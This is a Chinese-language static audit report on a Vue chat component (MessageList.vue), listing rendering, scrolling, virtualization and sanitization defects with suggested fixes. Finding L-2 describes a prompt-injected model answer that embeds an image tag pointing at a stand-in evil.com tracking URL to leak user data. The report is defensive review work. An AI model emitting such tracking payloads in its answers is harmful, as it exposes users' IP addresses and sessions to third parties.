# 缺陷审查报告：MessageList.vue

- **审查对象**：`frontend/src/components/MessageList.vue`（1713 行，全文通读）
- **审查方式**：只读静态审查（环境无 node_modules，无法运行 vue-tsc/build，结论均来自源码交叉比对）；直接协作者已逐一核实——`types/chat.ts`（ChatMessage/ChatCitationCard/RetrievalTrace 全文）、`types/react.ts`（ReactTraceStep）、父组件 `App.vue:91-117`（props/emits 接线、`v-if="activeView === 'chat'"`、`hydrating` 初值 true 仅在 onMounted setTimeout 置 false）、`composables/useChatEngine.ts`（流式更新为**原地变更** `messages.value[i].content += token`、`ui.scrollToBottom` 每 token 非强制调用、`rateAnswer`/`regenerateFrom`/`submitEditAndResend` 守卫逻辑）、`rag/RagAnswerService.java:235-264`（citationCards 的 `file` 为**已去掉 .pdf** 的 displayName）、依赖版本（marked ^18 token 对象签名、dompurify ^3、element-plus 全局注册、highlight.js ^11 core 子集注册）、CSS 变量（`--ui-*`/`--color-*`/`--radius-chip`/`--shadow-card` 定义于 `styles/app-shell.css`，经 `.app-shell` 继承可达；`--ui-bg` 有 fallback）
- **审查日期**：2026-11-04
- **约束遵守**：未修改任何源码；本报告为唯一新增文件；未执行 git/npm install/build 操作
- **关联报告**：`reports/audit-AnswerFeedbackService.java.md`（answerFeedbackMap 的后端侧）、`reports/audit-HybridRetrievalService.java.md`（retrievalTrace 数据源）

---

## 概览

该组件是聊天主视图：消息虚拟化渲染（估算+实测双高、二分定位、上下 spacer）、marked+DOMPurify 的 markdown 渲染、条款引用卡片、Agent 轨迹时间线、行内操作（复制/重试/评分/编辑重发）。做对的部分：

- **XSS 双防线扎实**：`v-html` 内容全部经 `marked.parse → DOMPurify.sanitize`（白名单属性 + FORBID_TAGS/ATTR，`:488-519`）；snippet 走"先 `escapeHtml` 再包 `<mark>`"（`:598-610`），且关键词正则做了元字符转义；中文关键词与 HTML 实体（ASCII）无交集，`<mark>` 注入实体不会发生；
- **反向 tabnabbing 有专门防线**：`afterSanitizeAttributes` hook 给 `target="_blank"` 链接合并 `noopener noreferrer`（`:478-486`）；
- **代码复制设计正确**：`data-code` 存 base64 + 事件委托（`:776-795`），`toBase64/fromBase64` 用 TextEncoder/TextDecoder 正确处理 UTF-8；
- **流式期间用纯文本渲染**（`:51-53`），避免逐 token 全量 markdown 重解析，注释明确了动机；
- **props/emits 契约与父组件完全对上**：9 个事件、18 个 props 与 App.vue:93-117 一一对应，`v-model:editing-message-draft` 有 computed 代理（`:553-558`），`defineExpose` 的 `scrollToBottom`/`resetHeights` 均被 App.vue 使用；
- **`entry.index` 传给父组件的是全量数组下标**，与 useChatEngine 直接按全量数组操作（slice/splice）的语义一致；
- 后端契约核对无误：`citationTextOf` 拼 `.pdf` 后缀正确补回后端已剥离的扩展名，`openCitation` 的 `source=...,chunk=...` 格式与 `parseCitation`（useChatEngine:150-159）互相咬合。

核心问题集中在**虚拟化测量的自洽性**（H-1、M-3）与**"最后一行/全局展开态"的判定逻辑**（H-2、M-2），以及流式期间的滚动与操作守卫（M-1、M-4）。

---

## 高严重度

### H-1 高度测量双基准不一致：`contentRect`（不含 padding）覆盖了 `getBoundingClientRect`（含 padding）的准确值，每行系统性少算 18px

- **位置**：`:751`（ref 回调：`Math.ceil(element.getBoundingClientRect().height)`，含 padding）、`:829`（ResizeObserver：`Math.ceil(entry.contentRect.height)`，**不含 padding**）、CSS `:919-927`（`.message-row { padding: 0 20px 18px; }`，底部 18px、顶部 0）
- **描述**：两个测量路径的基准不同：`getBoundingClientRect` 返回 border-box（含 18px 底部 padding），`contentRect` 只算 content-box（少 18px）。而 ResizeObserver 规范保证 `observe()` 后**必然派发一次初始回调**——所以每个被观察的行都会经历：ref 回调记入准确高度 → observer 初始回调立刻用"少 18px"的值覆盖。此后只要行内容变化（展开引用卡、评分按钮换行等），高度都会在"准确 +18"与"少 18"之间翻转（`syncMessageHeight` 的 ±1px 容差拦不住 18px）。
- **触发条件**：任一会话渲染后被观察的行发生内容尺寸变化；或用户滚动导致虚拟窗口重算——`messageMetrics` 的累计 offset 与真实 DOM 高度差 `18 × 行数`（50 条消息 = 900px 漂移），二分查找 `findMetricIndexByOffset`（`:652-674`）对同一 `scrollTop` 命中的行向下偏移，中段滚动出现窗口选择漂移与行重挂时的高度回跳抖动。
- **影响**：虚拟化布局的核心数据自相矛盾：spacer 高度与真实行高不匹配，长会话中段滚动出现跳动/空隙；`totalVirtualHeight`（`:643-650`）失真。
- **修复建议**：统一基准——ResizeObserver 回改用 `entry.borderBoxSize?.[0]?.blockSize`（或继续 `entry.target.getBoundingClientRect().height`），与 ref 回调一致；或反过来让 ref 回调也用 `contentRect` 并把 18px padding 移到内层元素。任选其一，保证两处测的是同一个盒子。

### H-2 Agent 轨迹面板的"最后一行"判定错误：`entry.index === virtualMessages.length - 1` 混淆了全量下标与虚拟窗口下标

- **位置**：`:224`（`v-if="traceSteps.length && entry.index === virtualMessages.length - 1"`）
- **描述**：`entry.index` 是消息在**全量** `props.messages` 中的下标，而 `virtualMessages.length` 是**虚拟窗口内**的行数。两个量纲完全不同：
  - 长会话滚到底部时（最需要看最新轨迹的场景），窗口如 `[170, 199]`，`virtualMessages.length` = 30，而最新消息的 `entry.index` = 199 → **最新一条助手消息永远不显示轨迹面板**；
  - 窗口覆盖 `[0, 29]` 时，第 30 行（下标 29，可能是任意旧消息）恰好满足 `29 === 30 - 1` → 轨迹面板（全局的 `traceSteps`，本意属于最新请求）**出现在错误的旧行上**。
  只有消息总数恰好等于窗口行数时才碰巧正确。
- **触发条件**：消息数超过虚拟窗口宽度（正常使用必然）；或窗口未覆盖列表尾部时。
- **影响**：Agent 轨迹时间线这一功能在长会话中基本不可用（最新消息不显示），且会把全局 traceSteps 错挂到历史消息上误导用户。
- **修复建议**：改为 `entry.index === props.messages.length - 1`；更稳妥的做法是把"展示轨迹的消息 id"作为父组件状态传入，而不是在渲染层按下标猜。对外 props/emits 不需变更。

---

## 中严重度

### M-1 流式期间滚动被强制拽到底部：`|| props.sending` 使引擎的"就近跟随"语义失效

- **位置**：`:764-768`（`if (force || remaining < 180 || props.sending) { element.scrollTop = element.scrollHeight; }`）；对照 `useChatEngine.ts:308`（每 token 调用 `void ui.scrollToBottom()`——**非强制**，期望"仅当用户还在底部附近时跟随"）
- **描述**：引擎按 token 调非强制滚动，意图是"用户上翻阅读时不要打扰"；但组件内的 `|| props.sending` 在整个流式期间恒为 true，把每次调用都变成强制滚底。结果：回答生成期间用户向上滚动查看历史消息，下一个 token 到达即被拽回底部，如此反复，流式期间实际上无法上翻。
- **触发条件**：任一流式回答期间向上滚动。
- **影响**：核心阅读路径的可用性缺陷；`remaining < 180` 的就近判断被完全架空。
- **修复建议**：删除 `|| props.sending` 分支，保留 `force || remaining < 180`；如需"流式默认跟随"，由引擎在 token 事件里传 `force` 与否决定，组件不应单方面升级语义。

### M-2 `expandedTraceOpen` 是全局单值，却渲染在每一行：任一行切换，所有可见行的轨迹详情同时开合

- **位置**：`:141-152`（每行的 toggle 按钮 emit 同一事件）、`:153`（`v-if="expandedTraceOpen"` 作用于**每行**的详情块）；父组件 `useChatEngine.ts:146-148`（单个 boolean）
- **描述**：检索轨迹详情的展开态是组件级单值，但 `v-if` 位于每行的模板内——点击任意一行的"检索链路"按钮，当前窗口内**所有**行的详情表格同时展开/收起。与每行各自的 `entry.item.retrievalTrace` 数据结构语义冲突（每条消息有自己的轨迹，展开态却共享）。对照引用卡片用了 `Set<string>` 按消息 id 逐条展开（`:61-96`），同一组件内两套交互模型不一致。
- **触发条件**：点击任一"检索链路"按钮。
- **影响**：多行详情同时弹出撑乱布局；用户无法只看某一条消息的轨迹。
- **修复建议**：仿照 `expandedCitationCards`，把展开态改为 `Set<messageId>`（新增 prop + toggle 事件携带消息 id），或把详情收进单行的 `<details>` 元素让浏览器管理局部状态。不改已有事件签名的前提下可新增事件。

### M-3 从评测页切回时初始渲染的行永远不会被 ResizeObserver 观察：observer 在 `onMounted` 才创建，而 ref 回调先于它执行

- **位置**：`:739-755`（`setMessageRowRef`：`if (resizeObserver) resizeObserver.observe(element)`——observer 为 null 时只记入 map，不观察）、`:818-832`（observer 在 `onMounted` 中创建，创建后**未补挂** `messageRowElements` 中已有的元素）；父组件 `App.vue:91`（`v-if="activeView === 'chat'"`）+ `App.vue:229,499`（`hydrating` 仅首次挂载为 true）
- **描述**：首次进入聊天页时 `hydrating=true`，行在 observer 就绪后才渲染，恰好躲过该问题；但"切换到评测页再切回"时组件**重新挂载**而 `hydrating` 已是 false——行随首次 patch 渲染，ref 回调全部执行于 `onMounted` 之前，此时 `resizeObserver` 仍是 null。这批行被记入 `messageRowElements` 并测量了一次，但**永远不会被观察**：之后内容高度变化（展开引用卡、最后一条流式增长、评分禁用态换行）不再触发 `syncMessageHeight`，度量与 DOM 脱节，直到该行滚出窗口重挂才自愈。
- **触发条件**：`activeView: 'chat' → 'evaluation' → 'chat'` 切换（props 注释明示该场景是设计目标之一），随后展开引用卡或继续对话。
- **影响**：切回视图后虚拟化高度失真、布局漂移，恰是跨视图保留状态这个设计最需要正确的场景。
- **修复建议**：`onMounted` 创建 observer 后补挂存量元素（`messageRowElements.forEach(el => resizeObserver?.observe(el))`）；或把 observer 创建提到模块作用域/`setup` 顶部，使 ref 回调时必然可用。

### M-4 流式/发送期间操作按钮不失效：可对流式中的回答评分（提交半截 answer）、可在流式中重试分叉

- **位置**：`:328-366`（复制/重试分支/评分/编辑后重发四个按钮均无 `sending`/`state` 相关 disabled；评分按钮只检查已评分与 loading）、`:333`（`regenerate-from`）、`:344`、`:355`（`rate-answer`）；对照引擎侧：`useChatEngine.ts:444`（`regenerateFrom` 无 sending 守卫，直接 fork 分支并 `ask`）、`:182-200`（`rateAnswer` 只查 role/鉴权/重复评分，无 sending 检查）；对照 `:486`（`submitEditAndResend` 有 `sending` 守卫——引擎侧守卫不一致）
- **描述**：三个具体路径：① 对 `state === 'streaming'` 的回答点 👍/👎，`rateAnswer` 会把**尚未生成完的半截 answer** 作为反馈提交（`AnswerFeedbackSubmitVO.answer` 必填、无长度校验，半截文本照单全收，且提交后按钮永久禁用，用户无法对完整回答重新评分）；② 流式中点"重试分支"，`regenerateFrom` 无守卫，直接在当前流式会话上 fork 分支并again发起请求，与进行中的流互相踩状态；③ "编辑后重发"在流式中打开编辑框（start-edit 无守卫），提交虽有守卫但草稿状态与流式并行。
- **触发条件**：回答生成中点击任一操作按钮。
- **影响**：半截数据入库（与后端评测数据集直接相关）、会话状态错乱、按钮永久禁用导致无法补救。
- **修复建议**：组件层给重试/评分/编辑按钮统一加 `:disabled="sending || entry.item.state === 'streaming' || entry.item.state === 'pending'"`；引擎侧 `regenerateFrom`/`rateAnswer` 补 `sending` 守卫与 `submitEditAndResend` 对齐（纵深防御）。组件对外签名不变。

### M-5 `watch { deep: false }` 与父组件"原地变更"的契约不匹配：watch 体对流式/追加/回滚路径全部失效

- **位置**：`:802-816`（`watch(() => props.messages, …, { deep: false })`）；对照 `App.vue:522-523`（prop 注释："由父组件持有并**原地变更**"）与 `useChatEngine.ts:264-266`（push）、`:305`（`content +=`）、`:397`（错误回滚 splice）
- **描述**：watch 源 `() => props.messages` 只在数组**引用变化**时触发，而引擎的主要更新路径全部是原地变更（引用不变）：token 追加、push 新消息、splice 回滚都不会触发该 watch。后果：① watch 里的 `scrollToBottom()`（`:813`）在这些路径上从不执行——目前只是碰巧由引擎侧 `ui.scrollToBottom`（:278/:308/:427）补位，职责重叠且互不知情；② 高度记录清理（`:805-812`）只在少数整体替换（如 `messages.value = messages.value.map(...)`，useChatEngine:238）时执行，splice 回滚删除的消息高度成为死数据（跨分支操作积累，直到会话切换 `resetHeights`）。
- **触发条件**：所有正常流式对话路径（持续存在，只是被引擎侧补偿掩盖）。
- **影响**：当前无直接用户可见故障，但这是脆弱的隐式契约：任何一侧改动（如引擎不再逐 token 调 scrollToBottom）就会显形为"流式不跟随"；死高度数据轻微放大 metrics 计算面。
- **修复建议**：二选一并写明契约：要么 watch 改为监听 `() => props.messages.length` 与深度事件（或父组件在变更后显式调用 expose 的方法），要么删掉 watch 中的 scrollToBottom、只保留清理逻辑并让引擎全面负责滚动。不改对外签名。

---

## 低严重度

### L-1 代码块行号渲染多出一个末行

- **位置**：`:453-459`
- **描述**：`highlighted.split('\n')`——hljs 输出以 `\n` 结尾时会产生末尾空串，被渲染为带行号的 `&nbsp;` 空行，代码块底部多一行号。
- **修复建议**：`highlighted.replace(/\n$/, '').split('\n')`。

### L-2 DOMPurify 属性白名单允许 `src`，LLM 输出可注入远程追踪图片；且缺 `start` 使有序列表序号丢失

- **位置**：`:498-518`（ALLOWED_ATTR 含 `src`；不含 `start`）
- **描述**：提示注入的回答可携带 `<img src="https://evil.com/track?t=…">`，渲染即向第三方发起请求（IP/会话泄露面）；同时白名单漏掉 `start`，`<ol start="5">` 渲染为从 1 开始。
- **修复建议**：从白名单移除 `src` 或通过 hook 将 img src 限制为 data:/空；补上 `start`。

### L-3 `questionKeywords` 只匹配纯中文连续段，英文/数字关键词永不高亮；过滤器冗余

- **位置**：`:576-582`
- **描述**：正则 `[\u4e00-\u9fa5]{2,}` 排除了英文术语、型号、数字（规章类问答里常见的"GPA""四六级"等混排词）；`.filter(word => word.length >= 2)` 对 `{2,}` 的结果是恒真冗余。另外匹配的是整段中文短语（无分词），与后端 AnswerFeedbackService 的关键词提取缺陷同族。
- **修复建议**：正则放宽为 `[\u4e00-\u9fa5A-Za-z0-9]{2,}`；删掉冗余 filter。

### L-4 DOMPurify hook 注释与实现不符：`addHook` 是追加而非替换

- **位置**：`:472-477`（注释："hooks are keyed by event name and replace prior registrations"）
- **描述**：DOMPurify 的 hook 按事件名**追加到数组**，不是替换。当前只在模块加载时注册一次故无实际危害，但注释描述的"安全性依据"是错的——dev HMR 或未来任何重复 import 场景下 hook 会累积，`rel` 合并虽幂等但认知模型错误。
- **修复建议**：修正注释；如需绝对防重复可在 addHook 前调用 `DOMPurify.removeAllHooks`（模块级一次性执行的守卫）。

### L-5 "检索四路召回"为硬编码假数据（40/25/20/15%），与同文件"非真实耗时"的诚实标注不一致

- **位置**：`:280-296`
- **描述**：Agent 轨迹第一步下方的四路召回条形图是写死的百分比，无任何"示意/占位"标注；而同组件的检索轨迹表特意标注"轨迹未接入：以下为占位行，非真实耗时"（`:154-156`）。同一界面两种诚实标准，用户会把假数据当真实召回分布。
- **修复建议**：接入真实数据（各路召回来源标记），或加与 `:155` 同款的占位说明。

### L-6 无引用兜底提示用 `content.includes('我是有章')` 猜测

- **位置**：`:124-133`
- **描述**：只要回答文本恰含"我是有章"字样（如引用对话或自我介绍）就隐藏"未匹配到规章原文"的黄条；判断依据是文案而非结构化字段（如后端的 routeProfile/citationCoverage），脆弱且语义漂移风险高。
- **修复建议**：改由后端/父组件下发结构化标记（如 `hasCitations` 布尔或 routeProfile），组件只渲染。

### L-7 样式两段重复定义互相覆盖，迁移遗留难以维护

- **位置**：`:933-943` vs `:1590-1602`（.avatar 两套）、`:974-990` vs `:1604-1623`（.bubble 两套）、`:1037-1044` vs `:1646-1658`（.citation-title/.citation-card 两套）、`:1155-1164` vs `:1686-1691`（.no-citation-fallback 两套）等
- **描述**：文件头部注释说明是"自 App.vue 原样迁移"，但同文件内保留了两套先后覆盖的声明（第二套"── 消息 ──"段覆盖第一套的大部分背景/边框）。第一套中部分规则已成死代码，改样式时极易改错段。
- **修复建议**：合并为单一声明集（保持视觉结果不变），删除被完全覆盖的规则。

### L-8 滚动事件未节流

- **位置**：`:715-721`
- **描述**：每个 scroll 事件直接写 `scrollTop` ref，触发 `virtualRange`/`virtualMessages`/两个 spacer 样式重算。计算本身廉价（二分+切片），中低消息量无感，但长会话高频滚动下是不必要的响应式开销。
- **修复建议**：用 `requestAnimationFrame` 合帧，或仅当 `Math.abs(newScrollTop - old) > 阈值` 时更新。

---

## 修复优先级建议

1. **先做 H-1 + M-3（虚拟化测量自洽性）**：统一测量基准 + observer 补挂存量行——两者共同决定虚拟化布局是否可信，修复都局限在本组件内、不动 props/emits。
2. **再做 H-2 + M-2（展示判定）**：轨迹面板"最后一行"判定改为全量下标、trace 展开态改为按消息 id 的 Set——直接决定轨迹功能在长会话中是否可用。
3. **M-1 + M-4（流式期间交互）**：去掉 `|| props.sending` 强制滚底、按钮补 disabled 与引擎守卫——用户可感知的体验与数据质量（半截 answer 入反馈库）问题。
4. **M-5 与低严重度项**：watch 契约整理后单项都很小，可随以上任意一批顺带完成。
